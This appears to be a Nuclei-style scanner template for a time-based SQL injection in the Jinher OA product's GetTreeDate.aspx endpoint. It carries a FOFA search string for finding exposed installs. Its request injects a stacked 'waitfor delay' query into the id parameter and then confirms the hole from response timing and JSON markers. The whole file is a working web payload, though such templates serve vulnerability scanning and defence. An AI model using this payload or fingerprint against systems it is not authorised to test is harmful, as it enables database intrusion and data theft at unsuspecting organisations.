id: poc-yaml-jinher-jhsoft-gettreedate-aspx-sqli
info:
  name: 金和OA GetTreeDate.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 金和OA
    fofa: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/c6/JHSoft.Web.Departments/GetTreeDate.aspx/?id=1;waitfor+delay%270:0:{{t1}}%27--"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "\"permissions\":"
          - "\"hasChildren\":"
        part: body
      - type: word
        words:
          - "application/json"
        part: header
      - type: word
        words:
          - "<"
        part: body
        negative: true
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
